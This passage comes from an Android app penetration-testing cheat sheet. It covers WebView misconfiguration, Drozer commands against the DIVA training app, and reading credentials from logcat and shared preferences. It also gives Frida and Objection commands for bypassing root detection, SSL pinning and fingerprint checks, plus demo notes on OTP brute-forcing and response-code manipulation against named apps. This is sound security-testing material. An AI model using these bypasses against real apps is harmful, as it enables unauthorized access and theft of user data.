</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34"></a><span class="hll"><span class="w">        </span><span class="n">webView</span><span class="p">.</span><span class="na">getSettings</span><span class="p">().</span><span class="na">setAllowUniversalAccessFromFileURLs</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span></span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35"></a><span class="hll">
</span></span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36"></a><span class="hll"><span class="w">        </span><span class="c1">//Enabling javascript</span>
</span></span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37"></a><span class="hll"><span class="w">        </span><span class="n">webView</span><span class="p">.</span><span class="na">getSettings</span><span class="p">().</span><span class="na">setJavaScriptEnabled</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span></span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38"></a>
</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getIntent</span><span class="p">().</span><span class="na">getExtras</span><span class="p">().</span><span class="na">getBoolean</span><span class="p">(</span><span class="s">&quot;is_reg&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40"></a><span class="w">            </span><span class="n">webView</span><span class="p">.</span><span class="na">loadUrl</span><span class="p">(</span><span class="s">&quot;file:///android_asset/registration.html&quot;</span><span class="p">);</span>
</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42"></a><span class="w">            </span><span class="n">webView</span><span class="p">.</span><span class="na">loadUrl</span><span class="p">(</span><span class="n">getIntent</span><span class="p">().</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&quot;reg_url&quot;</span><span class="p">));</span>
</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45"></a><span class="p">}</span>
</span></code></pre></div></td></tr></table></div></p>
<ul>
<li>Scenarios<ul>
<li>If an Authorization header is being sent while requesting the attacker-controlled domain.</li>
<li>If the application loads URLs with HTTP</li>
</ul>
</li>
<li><code>setAllowUniversalAccessFromFileURLs</code> sets whether cross-origin requests in the context of a file schema URL should be allowed to access content from any origin. This include access to content from other file scheme URLs or web contexts.</li>
<li>The setting removes all the <code>same-origin</code> policy restrictions allow urls make requests from files.</li>
<li><code>setJavaScriptEnabled</code> allow an attacker to carry out XSS, token stealing</li>
</ul>
<h2 id="static-analysis">Static Analysis</h2>
<ul>
<li>Static Analysis is all about decompiling and reverse engineering the APK file.</li>
<li>Once decompiled or reverse engineered, we check out for certain specific file<ul>
<li>AndroidManifest.xml</li>
<li>Application is Debuggable</li>
<li>Exported Activity is true</li>
<li>Check for typographic errors in custom permissions</li>
<li>Check for Exported Broadcast behaviour</li>
<li>Check for Hardcoded API keys, Comments, Secrets, etc.</li>
<li>Checking for Intents, etc.</li>
</ul>
</li>
</ul>
<h4 id="mobsf-android">MobSF Android</h4>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> stands for Mobile Security Framework, It's an automated, all-in-one mobile application penetration framework.</li>
<li>Helps to perform runtime assessment, Reports can be downloaded in PDF format, It's Open-source and clean to install.</li>
<li><a href="https://github.com/ashok5141/Application-Security-Cheatsheet/blob/main/Reports/Android_BugBazaar.pdf">Bugbazaar Report</a></li>
</ul>
<h4 id="static-analysis-tools">Static analysis Tools</h4>
<ul>
<li>
<p><strong>CloudSEK BeVigil</strong> is a free mobile security tool, Offers services to recon mobile applications.</p>
<ul>
<li>Scan App is the feature which can scan applications and automatically find vulnerabilities.</li>
<li>Credit-based system <a href="https://bevigil.com/scan-app">bevigil</a> </li>
</ul>
</li>
<li>
<p><strong>Yaazhini</strong> is a free user-friendly uulnerability scanner for Android APK and API that's exclusively designed and developed to identify APK and API level.</p>
<ul>
<li>Yaazhini has two vulnerability scanners are:</li>
<li>Android Application APK vulnerability scanner</li>
<li>Android Application REST API vulnerability scanner <a href="https://www.vegabird.com/yaazhini/">Here</a></li>
</ul>
</li>
</ul>
<h4 id="shared-preferences-other-data-storage-options">Shared Preferences &amp; Other Data Storage options</h4>
<ul>
<li>Shared Preferences are one of the databases where developers usually store application related data.<ul>
<li>Most of the time this data is not encrypted and can be visible in plain text.</li>
<li>There is a high possibility that the data consists of usernames and passwords</li>
<li>Simply visit the location /data/data/package.name and view the contents of every file.</li>
</ul>
</li>
<li>Data Storage text file, <code>.db</code> file obsrve the code file so that, you know where it is saving <code>sqlite3 &lt;table&gt;</code> then <code>.tables</code> view info <code>slect * from &lt;table_name&gt;</code></li>
<li><strong>ADB Logcat</strong>: Lgcat is a command-line tool that dumps a log of system messages when the device throws an error and sends messages that you have written from your app with the class.<ul>
<li>Sometimes developers log errors, success messages, usernames, passwords which can be clearly visiable using logcat, command <code>adb logcat</code> you can filter some information <code>adb logcat | grep "&lt;password&gt;"</code></li>
</ul>
</li>
<li><strong>Pidcat</strong>: Pidcat is similar to Logcat except it only shows log entries for processes from a specific application package.<ul>
<li>During application development you often want to only display log messages coming from your app, command <code>pidcat &lt;packagename&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="hardcoded-credentials">Hardcoded Credentials</h4>
<ul>
<li>Many developers hard coded credentials in the app, search for secret, crypt, private, token etc.</li>
<li>Many apps use third party backend systems, analyse and <code>.json,.xml</code> files for credentials.</li>
<li>Many apps contain hidden features, search for develop, debug, fake, test in the app binary.</li>
<li>Check for different <code>.plist</code> files such as <code>GoogleService-Info.plist</code>. These might contain juicy API keys.</li>
</ul>
<h4 id="drozer">Drozer</h4>
<ul>
<li>Drozer is a security testing framework for Mobile Application, Allows you to use, share and exploit Android exploits, Open-source and simple to install.</li>
<li>It helps you to deploy a drozer Agent to a device through exploitation or social engineering.</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align: left;">Server</th>
<th style="text-align: left;">Agent</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><a href="https://hub.docker.com/r/drozerdocker/drozer">Server</a></td>
<td style="text-align: left;"><a href="https://github.com/ReversecLabs/drozer-agent/releases">Agent</a></td>
</tr>
<tr>
<td style="text-align: left;">Command <code>drozer console connect --server &lt;IP&gt;:31415</code></td>
<td style="text-align: left;">Open Agent app in phone turn server</td>
</tr>
</tbody>
</table>
<ul>
<li>Commands After setting up the Drozer server<ul>
<li>We can tweak the Exported, debuggable options with Drozer</li>
<li>When activity exported then their might be chance of other application might use this app activity.</li>
<li>Using this we open the certain activities with navigating the app menu
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>dz&gt;run<span class="w"> </span>app.package.list
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>run<span class="w"> </span>app.package.list<span class="w"> </span>-f<span class="w"> </span>diva<span class="w"> </span><span class="c1"># Filter the diva application, Above options take lot of time if know the package name</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>run<span class="w"> </span>app.package.info<span class="w"> </span>-a<span class="w"> </span>jakhar.aseem.diva<span class="w"> </span><span class="c1"># package information</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>run<span class="w"> </span>app.package.debuggable<span class="w"> </span><span class="c1"># list of packages debuggable</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>run<span class="w"> </span>app.package.manifest<span class="w"> </span>jakhar.aseem.diva<span class="w"> </span><span class="c1"># Gives the manifest file</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>run<span class="w"> </span>app.package.attacksurface<span class="w"> </span>jakhar.aseem.diva<span class="w"> </span><span class="c1"># gives attack surface of application</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="c1"># Activities </span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>run<span class="w"> </span>app.activity.info<span class="w"> </span>-a<span class="w"> </span>jakhar.aseem.diva
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>run<span class="w"> </span>app.activity.start<span class="w"> </span>--component<span class="w"> </span>jakhar.aseem.diva<span class="w"> </span>jakhar.aseem.diva.MainActivity
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>run<span class="w"> </span>app.activity.start<span class="w"> </span>--component<span class="w"> </span>jakhar.aseem.diva<span class="w"> </span>jakhar.aseem.diva.APICredsActivity
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>run<span class="w"> </span>app.activity.start<span class="w"> </span>--component<span class="w"> </span>jakhar.aseem.diva<span class="w"> </span>jakhar.aseem.diva.APICreds2Activity
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1"># Content providers</span>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>run<span class="w"> </span>scanner.provider.finduris<span class="w"> </span>-a<span class="w"> </span>jakhar.aseem.diva<span class="w"> </span><span class="c1"># Found 4 query them 2</span>
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>run<span class="w"> </span>app.provider.query<span class="w"> </span>content://jakhar.aseem.diva.provider.notesprovider/notes/<span class="w">   </span><span class="c1"># given the information table columns(_id, title, note)</span>
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>run<span class="w"> </span>app.provider.insert<span class="w"> </span>content://jakhar.aseem.diva.provider.notesprovider/notes/<span class="w"> </span><span class="c1"># Done</span>
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>run<span class="w"> </span>app.provider.insert<span class="w"> </span>content://jakhar.aseem.diva.provider.notesprovider/notes/<span class="w"> </span>--string<span class="w"> </span>title<span class="w"> </span>Hello<span class="w"> </span>--string<span class="w"> </span>note<span class="w"> </span>Hello<span class="w"> </span><span class="c1"># Done</span>
</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>run<span class="w"> </span>app.provider.query<span class="w"> </span>content://jakhar.aseem.diva.provider.notesprovider/notes/<span class="w">  </span><span class="c1"># Able to see the above inserted Hello, Hello information</span>
</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>run<span class="w"> </span>app.provider.delete<span class="w"> </span>content://jakhar.aseem.diva.provider.notesprovider/notes/<span class="w"> </span>--selection<span class="w"> </span><span class="s2">&quot;title=?&quot;</span><span class="w"> </span>--selection-args<span class="w"> </span>home<span class="w"> </span><span class="c1"># Done</span>
</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>run<span class="w"> </span>app.provider.query<span class="w"> </span>content://jakhar.aseem.diva.provider.notesprovider/notes/<span class="w"> </span><span class="c1"># Deleted the Home row in the table</span>
</span></code></pre></div></li>
</ul>
</li>
</ul>
<h4 id="firebase-real-time-database">Firebase Real-time Database</h4>
<ul>
<li>Firebase is a NoSQL cloud-based database, is stored in <code>.json</code> format and synchronized in real time.</li>
<li>If you find a firebase string, there might be chance of that it might be misconfigured, It looks like this <code>https://xyz.firebaseio.com/.json</code></li>
<li>If the response is:<ul>
<li>Permission Denied: This means that you cannot access it, so it's well configured</li>
<li>Null response or a bunch of JSON data: This means that the database is public and you at least have read access.</li>
</ul>
</li>
</ul>
<h4 id="pasteboard">Pasteboard</h4>
<ul>
<li>An application can also prevent its users to copy sensitive data to the clipboard which is recommended.</li>
<li>For Dynamic analysis, Objections pasteboard monitor can be used.<ul>
<li>First start the frida to check list apps open in the mobile if not open your app <code>frida-ps -Ua</code></li>
<li>Objection command <code>objection --gadget jakhar.aseem.diva explore</code></li>
<li>In the objection terminal <code>android clipboard monitor</code> enter some information on app then copy the info then you can sse that info in the objection terminal</li>
</ul>
</li>
</ul>
<h4 id="hot-patchingenforced-updating">Hot Patching/Enforced Updating</h4>
<ul>
<li>Developers can remotely patch all installations of their app instantly without having to resubmit the application to the App store and wait until it's approved.</li>
<li>Applications should be forced updated.</li>
<li>Try downloading an older version of the application and check if it allows forced update or not.</li>
</ul>
<h4 id="webview-related-vulnerabilities">WebView Related Vulnerabilities</h4>
<ul>
<li>WebView file access is enabled by default. Since API3(Cupcake 1.5) the method <code>setAllowFileAccess()</code> is available for explicitly enabling or disabling it. </li>
<li>Applications should forced updated. The WebView needs to use a file URL schema. e.g., <code>file:///etc/passwd</code> to access the file.</li>
<li>If Javascript is enabled in WebView, we can try to perform javascript based attacks such as XSS.</li>
<li>The Remote WebView debugging allow to access the WebView with the chrome Developer Tools. The device needs to be accessiable by the PC(via USB, local emulator, local network) and running the debuggable WebView, then access chrome://inspect/#devices:</li>
</ul>
<h2 id="dynamic-analysis">Dynamic Analysis</h2>
<ul>
<li>Android SDK Platform- Tools is a component for the Android SDK. They help in the development of the Android Applications.</li>
</ul>
<h4 id="adb">ADB</h4>
<ul>
<li>ADB(Android Debug Bridge) is a versatile command-line tool that lets you communicate with a device.</li>
<li>It lets you interact with the devices and is generally used for debugging purpose, ADB comes installed with platform-tools.<ul>
<li>Commands <code>adb shell, pull,push, logcat</code></li>
</ul>
</li>
</ul>
<h4 id="bypass-root-detection-using-frida-objection">Bypass Root Detection using Frida, Objection</h4>
<ul>
<li>Frida is a dynamic code instrumentation toolkit that premits you to inject snippets of Javascript or your library into the native application on your operating systems like Windows, iOS, Android and more. Community code <a href="https://codeshare.frida.re/">Here</a><ul>
<li>SSL Pinning Bypass</li>
<li>Fingerprint Bypass</li>
</ul>
</li>
<li><strong>Objection</strong>: Is a runtime mobile exploration toolkit, powered by Frida built to help you access the security posture of the mobile applications, without needing a jailbreak.<ul>
<li>SSL Pinning bypass</li>
<li>Root Bypass</li>
<li>Capture Screenshots</li>
</ul>
</li>
<li>Setting up Frida and Objection<ul>
<li><code>python3 -m pip install frida objection frida-tools</code></li>
<li><code>adb shell getprop ro.product.cpu.abi</code> =&gt; Get the device configuration</li>
<li>Download the device configuration server file <a href="https://github.com/frida/frida/releases">Here</a></li>
<li>Push the server file using <code>adb push C:\ADB\frida-server /data/local/tmp</code></li>
<li>Set up permissions using adb shell <code>chmod 777 /data/local/tmp/frida-server</code></li>
</ul>
</li>
<li><strong>Root Detection</strong><ul>
<li>Rooting is the process of unlocking an Android device in order to access higher administrative privileged controls.</li>
<li>Most Android developers, do not want their applications to be running on a rooted device, since this could lead to security concerns and impacts.</li>
<li>However, Root Detection is not strongly implemented.</li>
<li>This is the same case with Emulator Detection as well.</li>
</ul>
</li>
<li><strong>Bypassing Root Detection using Frida</strong><ul>
<li>Check the App Package ID using <code>frida-ps -Ua</code></li>
<li>Hook the Jailbreak frida <a href="https://codeshare.frida.re/@KishorBal/multiple-root-detection-bypass/">script</a> using <code>frida -U -f package_id -l root.js</code></li>
<li>Same way we can bypass the Emulator detection as weel.</li>
</ul>
</li>
<li><strong>Root Detection Bypass using Medusa</strong><ul>
<li>Medusa is a flexible framework that automates the procedures and methods used in the dynamic analysis of Android applications, Link is <a href="https://github.com/Ch0pin/medusa">here</a></li>
<li>Launch Medusa and run the these below commands<ul>
<li>run this <code>python3 medusa.py</code>, search <code>anti_debug</code>, use <code>helpers/anti_debug</code>, then <code>compile</code> package id <code>run -f package_id</code></li>
</ul>
</li>
</ul>
</li>
<li><strong>Root Detection Bypass using Objection</strong><ul>
<li>Objection is a runtime mobile exploration toolkit, To install objection simply run command <code>pip3 install objection, frida, frida-tools</code></li>
<li>Explore the package using <code>objection --gadget package_name explore</code></li>
<li>Disable jailbreak detection using <code>android root diable</code> still giving the device rooted.</li>
<li>So try to find the which class <code>doesSUexit</code> is responsiable in the <strong>Jadx-gui</strong><ul>
<li>Use the command in objection <code>android hooking set return com.android.insecurebankv2.postLogin.doesSUexit false</code> Device not rooted</li>
</ul>
</li>
</ul>
</li>
<li><strong>Root Detection Bypass using Magisk</strong><ul>
<li>MagiskHide module in the Magisk application, This can only be done if the phone is rooted using Magisk Module.</li>
<li>Enable the MagiskHide module from the app settings.</li>
<li>Magisk App &gt; v23.0 provides an alternative feature -Zygisk Denylist</li>
<li>Enable Zygisk, DenyList from the app settings.</li>
</ul>
</li>
</ul>
<h4 id="ssl-pinning-fringerprint-bypass-using-frida-objection">SSL Pinning &amp; Fringerprint Bypass  using Frida, Objection</h4>
<ul>
<li>SSL certificate pinning is a technique using which only known certificate are trusted.</li>
<li>This security measure pins the identity of trustworthy certificate on mobile apps and blocks unknown documents from the suspicious servers.</li>
<li>However, SSL pinning is not strongly implemented.</li>
<li><strong>Bypassing SSL Pinning using Frida</strong><ul>
<li>Check the App Package ID using <code>frida-ps -Ua</code></li>
<li>Hook the SSL pinning Bypass frida <a href="https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/">script</a> using <code>frida -U -f package_id -l sslpinning.js</code></li>
</ul>
</li>
<li><strong>Bypassing SSL Pinning using Objection</strong><ul>
<li>Objection is a runtime mobile exploration toolkit, To install simply run the command <code>pip3 install objection, frida, frida-tools</code></li>
<li>Explore the package using <code>objection --gadget package_name explore</code></li>
<li>Diable SSL pinning Bypass using <code>android sslpinning disable</code> </li>
</ul>
</li>
<li><strong>SSL Pinning Bypass by overwriting packaged CA Certificate with custom CA Certificate</strong><ul>
<li>A custom certificate chain is being distributed with an application, extracting the APK and overwriting the provided CA with our custom CA will let you bypass SSL Pinning.</li>
<li>Opening the APK with a tool such as APK studio makes the presence of certificate bundled with the deployed application obvious. The certificate are loacted under the <code>assets</code> directory</li>
<li>Two methods:<ul>
<li>Tool <code>apk-mitm</code> <a href="https://github.com/niklashigi/apk-mitm">Link</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>SSL Pinning Bypass using android-unpinner</strong><ul>
<li>This tool removes certificate pinning from APKs, Install the tool using <a href="https://github.com/mitmproxy/android-unpinner">Github Link</a></li>
<li>Launch the script using <code>android-unpinner all httptoolkit-pinning-demo.apk</code></li>
</ul>
</li>
<li><strong>Fingerprint Bypass</strong><ul>
<li>Some applications use fingerprints, in oder to verify the user details.</li>
<li>Although this method helps users save their time of entering USernames and Passwords, but the fingerprint is also bypass-able.</li>
<li>THe root cause is the response of the Fingerprint which is either false or 0 for un-match fingerprints.</li>
<li>Frida manipulates and reverse the response i.e.,<ul>
<li>false =&gt; ture</li>
<li>0 =&gt; 1</li>
</ul>
</li>
</ul>
</li>
<li>Check the App Package ID using <code>frida-ps -Ua</code></li>
<li>Hook the fingerprint Bypass frida <a href="https://codeshare.frida.re/@krapgras/android-biometric-bypass-update-android-11/">script</a> using <code>frida -U -f package_id -l fingerprint.js --no-pause</code></li>
</ul>
<h4 id="non-rooted-frida-and-objection">Non Rooted Frida and Objection</h4>
<ul>
<li>Patch the application <code>objection patchapk -s &lt;APPNAME.apk&gt;</code> it will check phone version according it build the application.</li>
<li>After installing the in the phone <code>objection explore</code> in theriminal app will work, able to capture the request.</li>
<li>This will take the screenshot of the application <code>android ui screenshot png</code> </li>
</ul>
<h2 id="progressive-web-application-attacks">Progressive Web Application Attacks</h2>
<ul>
<li>Progressive Web Applications(PWAs) are apps built with web technologies that we probably all know and love, like HTML, CSS, and JavaScript. But they have the feel and functionality of an actual native app.</li>
<li>A Native App is a software application built in a specific programming language for a specific device platform. Either IOS or Android.</li>
<li>Ex:- React, Flutter</li>
<li><strong>Bypassing Root &amp; SSL Pinning in PWAs</strong><ul>
<li>Same scripts as normal root detection can be used <a href="https://github.com/lpilorz/flutter-app/blob/master/frida-root-checker-bypass.js">Here</a></li>
<li>SSL Pinning Bypass <a href="https://github.com/horangi-cyops/flutter-ssl-pinning-bypass/blob/main/flutter-bypass-sslpinning.js">Here</a></li>
<li>Flutter <a href="https://github.com/jjogal/Android/tree/master/flutter-test-apps">Applications</a></li>
<li><a href="https://github.com/ptswarm/reFlutter">Reflutter</a> for adding IP address after that add the certificate from the <a href="https://github.com/patrickfav/uber-apk-signer">Uber-apk-signer</a>, Configure the burp and check the invisiable requests in the burp.</li>
</ul>
</li>
</ul>
<h2 id="demo">Demo</h2>
<ul>
<li>Demo 1- Insecure Permissions, FreshtoHome.apk, seen in the MobSF has permissions of <code>Access_COARSE_Location</code> is network based location permission, <code>Access_Fine_Location</code> fine GPS location permissions.</li>
<li>Demo 2- Application Signing &amp; Janus vulnerability, Limeroad.apk, App signed with v1, v2. Attacker add dynamic source code to the application without modifing the signature.</li>
<li>Demo 3- Hardcoded Credentials, FreshtoHoem.apk and Limeroad.apk, in MobSF has Firebase URl, Google api key, Google crash reporting api keys <a href="https://github.com/streaak/keyhacks">github</a></li>
<li>Demo 4- Shared Preference, Urbanic.apk has the check in the <code>/data/data/&lt;APP&gt;/shared_prefs</code> path has the <code>.xml</code> files</li>
<li>Demo 5- Insufficient Cryptography, FreshtoHome.apk and Limeroad.apk, Has the cryptographic encryption mode <code>CBC with PKCS5/PKCS7</code> padding, MD5, SHA1 algorithm.</li>
<li>Demo 6- Non Parameterized SQL Queries, FreshtoHome.apk, has Raw SQL quires cause SQL injection.</li>
<li>Demo 7- Insecure Logging, Urbanic.apk, PII information entering into the application visiable in the <code>adb logcat | grep "keyword_search"</code></li>
<li>Demo 8- WebView XSS, Trengo.apk, Uploaded normal XSS did not work, encoded the XSS payload with <code>.svg</code> so whever we click on this alert poping.</li>
<li>Demo 9- Pasteboard Monitor, bislari.apk, start the frida and objection monitor the clipboard in objection terminal, password copy restricted but when view the password then you can view and the objection captured the vulnerability.</li>
<li>Demo 10- Screenshot and Background Screen caching, bislari.apk, Run the objection <code>android ui screenshot png</code> it will save into desktop, application vulnerable screenshot.</li>
<li>Demo 11- Root Detection and SSL Pinning Bypass, mytoyota.apk, Start the frida server on mobile then identify the frida package name in the PC, frida script to bypass the it bypassed the root detection. SSL pinning is implemented so run the frida SSL bypass script so we can run the app see the communication in the burpsuite further you can play with web attacks.</li>
<li>Demo 12- Fingerprint Bypass, AppLock.apk, bypass the fingerprint use the frida script to bypass.</li>
<li>Demo 13- No Rate Limit, Binks.apk, First bypass the SLL pinning then Enter mobile number, we send the request to burp intruder try to send the null request send multiple OTPs, recevied multiple OTPs no rate limit for this. Tehn entered any random number for the OTP send the request to intruder it not implemeted rate limiting attacker can try to bruteforce this.</li>
<li>Demo 14- Authentication Issues - Status and Response Code Manipulation, sss.apk, frida bypass the SSL pinning, Login with OTP in the burp changed the OTP to random status code give 202 as otp is not correct, changed the status to 202 to 200 able to login with application.</li>
<li>Demo 15- Business Logic Issue, mytoyota.apk, SSL Pinning Bypass using the  frida script, Automatically Toyota id is assigned, Only 3 mobile numbers are we can add, send the reques the to repeater enter new mobile number, change the toyota id as well, this information saved on the server, So the validation on client only , no server side.</li>
<li>Demo 16- Flutter APK Root &amp; SSL Pinning Bypass, KisanKonnect.apk, FlutterShark shows you all the application running on flutter in your device, reflutter this for traffic monitor embeded the IP address, sign application with uber-apk-signer script, Configure the burp try to capture.</li>
</ul>
<h4 id="bug-bunty-tips">Bug bunty tips</h4>
<ul>
<li><a href="https://github.com/sushiwushi/bug-bounty-dorks">Link</a></li>
</ul>
<h2 id="android-file-structure">Android File Structure</h2>
<ul>
<li>File structure
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>â”œâ”€â”€<span class="w"> </span>AndroidManifest.xml<span class="w">   </span><span class="c1"># Application&#39;s configuration file; defines permissions, components, and security settings.</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>â”‚
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>â”œâ”€â”€<span class="w"> </span>classes.dex<span class="w">           </span><span class="c1"># Contains the app&#39;s compiled Java/Kotlin bytecode. This is the main code file to analyze.</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>â”‚
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>â”œâ”€â”€<span class="w"> </span>lib/<span class="w">                  </span><span class="c1"># Holds native libraries (in .so files) for different CPU architectures.</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>â”‚<span class="w">   </span>â”œâ”€â”€<span class="w"> </span>arm64-v8a/
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>â”‚<span class="w">   </span>â”œâ”€â”€<span class="w"> </span>armeabi-v7a/
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>â”‚<span class="w">   </span>â”œâ”€â”€<span class="w"> </span>x86/
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>â”‚<span class="w">   </span>â””â”€â”€<span class="w"> </span>x86_64/
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>â”‚
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>â”œâ”€â”€<span class="w"> </span>res/<span class="w">                  </span><span class="c1"># Contains compiled resources like layouts, strings, and images.</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>â”‚<span class="w">   </span>â”œâ”€â”€<span class="w"> </span>anim/
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>â”‚<span class="w">   </span>â”œâ”€â”€<span class="w"> </span>drawable/
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>â”‚<span class="w">   </span>â”œâ”€â”€<span class="w"> </span>layout/
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>â”‚<span class="w">   </span>â””â”€â”€<span class="w"> </span>values/
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>â”‚
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>â”œâ”€â”€<span class="w"> </span>assets/<span class="w">               </span><span class="c1"># A raw collection of bundled files (e.g., databases, configuration files).</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>â”‚
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>â””â”€â”€<span class="w"> </span>META-INF/<span class="w">             </span><span class="c1"># Contains the app&#39;s signature, manifest, and checksums. Critical for integrity verification.</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="w">    </span>â”œâ”€â”€<span class="w"> </span>CERT.RSA
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="w">    </span>â”œâ”€â”€<span class="w"> </span>CERT.SF
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="w">    </span>â””â”€â”€<span class="w"> </span>MANIFEST.MF
</span></code></pre></div></li>
</ul>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
